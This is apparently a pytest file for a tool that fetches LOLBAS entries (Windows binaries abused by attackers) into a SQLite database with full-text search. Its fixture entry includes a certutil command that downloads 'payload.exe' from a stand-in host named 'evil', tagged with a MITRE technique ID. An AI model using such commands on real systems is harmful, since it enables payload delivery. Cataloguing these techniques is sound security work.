"""
tests/phase0/test_lolbas_fetcher.py — LOLBAS fetcher tests.

VCR.py cassette strategy (PRD §5.3):
  Cassettes stored under tests/phase0/cassettes/lolbas/.
  record_mode='none' in CI (FORGE_CI=1); 'new_episodes' locally.

Coverage targets:
  - _normalise(): valid entry, missing Name, empty Commands, multi-category.
  - _bulk_insert(): INSERT OR IGNORE dedup; count accuracy.
  - FTS5 trigger fires on INSERT and enables search.
  - fetch_lolbas(): raises RuntimeError when offline_strict=True.
  - MITRE ID deduplication across commands.
  - OS family always 'windows' for LOLBAS entries.
"""
from __future__ import annotations

import json
import sqlite3
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from forge.phase0.etl_runner import _bootstrap_db, _LOLBAS_SCHEMA
from forge.phase0.lolbas_fetcher import _bulk_insert, _normalise, fetch_lolbas


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture()
def lolbas_db(tmp_path: Path) -> sqlite3.Connection:
    db_path = tmp_path / "lolbas.db"
    conn = _bootstrap_db(db_path, _LOLBAS_SCHEMA)
    yield conn
    conn.close()


def _make_entry(**overrides) -> dict:
    """Build a minimal valid LOLBAS JSON entry."""
    base = {
        "Name": "Certutil.exe",
        "Description": "Certificate management utility",
        "Commands": [
            {
                "Command": "certutil -urlcache -split -f http://evil/payload.exe",
                "Description": "Download file",
                "Usecase": "Download",
                "Category": "Download",
                "MitreID": "T1105",
            }
        ],
    }
    base.update(overrides)
    return base


# ---------------------------------------------------------------------------
# _normalise() tests
# ---------------------------------------------------------------------------

class TestNormalise:
    def test_valid_entry_produces_row(self) -> None:
        row = _normalise(_make_entry())
        assert row is not None
        assert row["name"] == "Certutil.exe"
        assert row["os_family"] == "windows"
        assert row["category"] == "download"
        assert "T1105" in row["mitre_technique"]
        assert "Download" in row["use_case"]

    def test_empty_name_returns_none(self) -> None:
        assert _normalise(_make_entry(Name="")) is None
        assert _normalise(_make_entry(Name=None)) is None

    def test_empty_commands_uses_misc_category(self) -> None:
        row = _normalise(_make_entry(Commands=[]))
        assert row is not None
        assert row["category"] == "misc"

    def test_mitre_deduplication(self) -> None:
        """Same MitreID across multiple commands appears only once."""
        entry = _make_entry(Commands=[
            {"Category": "Execute", "MitreID": "T1059", "Usecase": "Run", "Command": "cmd"},
            {"Category": "Execute", "MitreID": "T1059", "Usecase": "Run2", "Command": "cmd2"},
        ])
        row = _normalise(entry)
        assert row is not None
        assert row["mitre_technique"].count("T1059") == 1

    def test_use_case_deduplication(self) -> None:
        entry = _make_entry(Commands=[
            {"Category": "Download", "MitreID": "T1105", "Usecase": "Download", "Command": "c1"},
            {"Category": "Download", "MitreID": "T1105", "Usecase": "Download", "Command": "c2"},
        ])
        row = _normalise(entry)
        assert row is not None
        assert row["use_case"].count("Download") == 1

    def test_commands_stored_as_json_array(self) -> None:
        row = _normalise(_make_entry())
        assert row is not None
        parsed = json.loads(row["commands"])
        assert isinstance(parsed, list)
        assert len(parsed) == 1

    def test_stealth_rank_defaults_to_five(self) -> None:
        row = _normalise(_make_entry())
        assert row is not None
        assert row["stealth_rank"] == 5

    def test_source_set_to_lolbas(self) -> None:
        row = _normalise(_make_entry())
        assert row is not None
        assert row["source"] == "lolbas"

    def test_os_family_always_windows(self) -> None:
        row = _normalise(_make_entry())
        assert row is not None
        assert row["os_family"] == "windows"


# ---------------------------------------------------------------------------
# _bulk_insert() tests
# ---------------------------------------------------------------------------

class TestBulkInsert:
    def test_inserts_single_row(self, lolbas_db: sqlite3.Connection) -> None:
        row = _normalise(_make_entry())
        count = _bulk_insert(lolbas_db, [row])
        assert count == 1

    def test_dedup_ignores_duplicate_name(self, lolbas_db: sqlite3.Connection) -> None:
        row = _normalise(_make_entry())
        _bulk_insert(lolbas_db, [row])
        count = _bulk_insert(lolbas_db, [row])  # duplicate
        assert count == 0

    def test_inserts_multiple_distinct_rows(self, lolbas_db: sqlite3.Connection) -> None:
        rows = [
            _normalise(_make_entry(Name="Certutil.exe")),
            _normalise(_make_entry(Name="Bitsadmin.exe")),
            _normalise(_make_entry(Name="Mshta.exe")),
        ]
        count = _bulk_insert(lolbas_db, rows)
        assert count == 3

    def test_empty_batch_inserts_zero(self, lolbas_db: sqlite3.Connection) -> None:
        assert _bulk_insert(lolbas_db, []) == 0

    def test_fts5_trigger_fires_on_insert(self, lolbas_db: sqlite3.Connection) -> None:
        """FTS5 index must be queryable after INSERT."""
        row = _normalise(_make_entry(Name="Certutil.exe"))
        _bulk_insert(lolbas_db, [row])
        results = lolbas_db.execute(
            "SELECT rowid FROM lolbas_fts WHERE lolbas_fts MATCH 'certificate'"
        ).fetchall()
        assert len(results) >= 1

    def test_fts5_search_returns_correct_entry(self, lolbas_db: sqlite3.Connection) -> None:
        rows = [
            _normalise(_make_entry(Name="Certutil.exe")),
            _normalise(_make_entry(Name="Mshta.exe", Description="HTML Application host")),
        ]
        _bulk_insert(lolbas_db, rows)
        results = lolbas_db.execute(
            "SELECT name FROM lolbas WHERE id IN "
            "(SELECT rowid FROM lolbas_fts WHERE lolbas_fts MATCH 'html')"
        ).fetchall()
        names = [r[0] for r in results]
        assert "Mshta.exe" in names
        assert "Certutil.exe" not in names


# ---------------------------------------------------------------------------
# fetch_lolbas() tests
# ---------------------------------------------------------------------------

class TestFetchLolbas:
    def test_raises_on_offline_strict(self, lolbas_db: sqlite3.Connection) -> None:
        cfg = MagicMock()
        cfg.offline_strict = True
        with pytest.raises(RuntimeError, match="FORGE_OFFLINE_STRICT"):
            fetch_lolbas(lolbas_db, cfg)

    def test_fetch_parses_and_inserts(self, lolbas_db: sqlite3.Connection, tmp_path: Path) -> None:
        """Mock HTTP response with two LOLBAS entries; verify count returned."""
        import json  # noqa: PLC0415
        fake_payload = json.dumps([
            _make_entry(Name="Certutil.exe"),
            _make_entry(Name="Bitsadmin.exe", Description="Background transfer tool"),
        ]).encode()

        cfg = MagicMock()
        cfg.offline_strict = False
        cfg.proxy = None
        cfg.curl_profile = "chrome110"

        with patch("forge.phase0.lolbas_fetcher._http_get", return_value=fake_payload):
            count = fetch_lolbas(lolbas_db, cfg)

        assert count == 2

    def test_fetch_skips_invalid_entries(self, lolbas_db: sqlite3.Connection) -> None:
        """Entries with no Name must be silently skipped."""
        import json  # noqa: PLC0415
        fake_payload = json.dumps([
            {"Name": "", "Commands": []},
            _make_entry(Name="Certutil.exe"),
        ]).encode()

        cfg = MagicMock()
        cfg.offline_strict = False
        cfg.proxy = None
        cfg.curl_profile = "chrome110"

        with patch("forge.phase0.lolbas_fetcher._http_get", return_value=fake_payload):
            count = fetch_lolbas(lolbas_db, cfg)

        assert count == 1
